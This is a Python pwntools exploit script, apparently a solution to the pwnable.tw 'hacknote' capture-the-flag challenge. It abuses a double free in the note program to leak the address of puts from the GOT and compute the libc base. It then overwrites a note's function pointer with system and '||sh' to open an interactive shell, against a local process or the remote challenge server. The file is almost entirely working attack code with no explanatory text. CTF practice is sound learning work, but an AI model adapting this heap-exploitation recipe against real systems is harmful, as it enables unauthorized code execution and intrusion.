#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

context.log_level = "debug"
pwn_file="./hacknote"
elf=ELF(pwn_file)

os.environ['LD_LIBRARY_PATH'] = '/media/psf/CTF/pwnabletw/hacknote'
libc=ELF("./libc.so.6")

if len(sys.argv) == 1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("chall.pwnable.tw", 10102)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add(length, content=""):
    r.sendlineafter("Your choice :",'1')
    r.sendlineafter("Note size :",str(length))
    r.sendlineafter("Content :",content)
    r.recvuntil("Success !")

def delete(index):
    r.sendlineafter("Your choice :",'2')
    r.sendlineafter("Index :",str(index))
    r.recvuntil("Success")

def printnote(index):
    r.sendlineafter("Your choice :",'3')
    r.sendlineafter("Index :",str(index))
    content = r.recvline()
    return content

add(0x8) # A0,B0
add(0x20) # A1

delete(0)
delete(1)
delete(0)

add(0x8,'a'*8) # A3-> A0; B2-> B0

putsload = 0x804862B
add(0x8, p32(putsload)+p32(elf.got['puts']) ) #A3-> A1; B3-> A0
puts_addr = u32(printnote(2)[:4])
libc.address = puts_addr - libc.sym['puts']

info("libc start: %16x", libc.address)

system = libc.sym['system']
binsh  = list(libc.search('/bin/sh'))[0]

delete(3)
debug()
add(0x8, p32(system) + "||sh") # A4 -> A1; A4 ->A0 
r.sendlineafter("Your choice :",'3')
r.sendlineafter("Index :",str(2))
r.interactive()
